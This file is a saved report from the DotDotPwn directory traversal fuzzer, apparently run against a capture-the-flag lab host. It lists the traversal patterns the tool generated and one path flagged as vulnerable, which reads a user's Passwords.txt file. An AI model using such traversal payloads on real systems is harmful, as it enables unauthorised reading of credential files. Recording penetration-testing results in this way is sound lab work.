@@ -1,0 +1,48 @@
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                              - DotDotPwn v3.0.2 -                             #
+#                         The Directory Traversal Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                               by chr1x & nitr0us                              #
+#################################################################################
+
+[+] Report name: Reports/10.10.10.184_05-03-2020_03-35.txt
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 10.10.10.184
+[+] Protocol: http
+[+] Port: 80
+[+] Service detected:
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Multiplying 6 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Appending '/Users/Nathan/Desktop/Passwords.txt' to the Traversal Strings
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 5514
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 3.33 traversals per second
+[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
+. 
+[*] Testing Path: http://10.10.10.184:80/../../../Users/Nathan/Desktop/Passwords.txt <- VULNERABLE!
+
+[+] Fuzz testing finished after 0.02 minutes (1 seconds)
+[+] Total Traversals found: 1
+[+] Report saved: Reports/10.10.10.184_05-03-2020_03-35.txt
